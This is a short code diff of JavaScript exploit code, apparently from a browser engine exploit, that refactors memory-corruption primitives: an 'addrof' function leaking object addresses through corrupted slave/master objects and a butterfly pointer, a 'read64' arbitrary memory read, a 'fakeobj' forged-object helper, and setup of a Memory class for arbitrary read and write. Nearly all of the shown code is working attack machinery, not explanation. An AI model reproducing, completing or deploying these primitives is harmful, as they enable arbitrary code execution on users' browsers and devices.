@@ -377,17 +377,14 @@ addEventListener('unhandledrejection', event => {
     };
 
 function read64(addr) {
-    read_mem_setup(addr, 8);
-    var bytes = [];
-    for (var i = 0; i < 8; i++) {
-        bytes.push(arw_slave[i]);
-    }
-    var res = 0n;
-    for (var i = 7; i >= 0; i--) {
-        res = (res << 8n) + BigInt(bytes[i]);
-    }
-    return res;
+	return new Int64(read(addr, 8));
 }
+  function addrof(obj) {
+  obj_slave.obj   = obj;
+  return read64(g_jsview_butterfly.sub(16));
+}
+
+
 	
     (function () {
         var magic = boot_fakeobj(boot_addrof(obj) + 16);
@@ -523,18 +520,14 @@ function read64(addr) {
  
   const mod = await import('./module/mem.mjs');
   const imod = await import('./module/int64.mjs');
-  const Memory = mod.Memory;
-  const Int64 = imod.Int;
 
-function addrof(a){
-    obj_slave.obj = a;
-	   return new Int64(obj_master[4], obj_master[5]);
-
-}	 
-  const obj = { addr: null, 0: 0 };	 
-const obj_addr =  addrof(obj);
-  const obj_bt = read64(obj_addr.add(8));
-  const obj_p = obj_addr;
+   let Memory = mod.Memory;
+   let obj = {addr: null, 0: 0};
+   let obj_p = addrof(obj);
+   let obj_bt = read64(obj_p.add(8));
+   obj_p = new imod.Int(obj_p.low, obj_p.hi);
+  obj_bt = new imod.Int(obj_bt.low, obj_bt.hi);
+	 
   new Memory(
     new Uint32Array(new ArrayBuffer(32)),
     new DataView(new ArrayBuffer(16)),
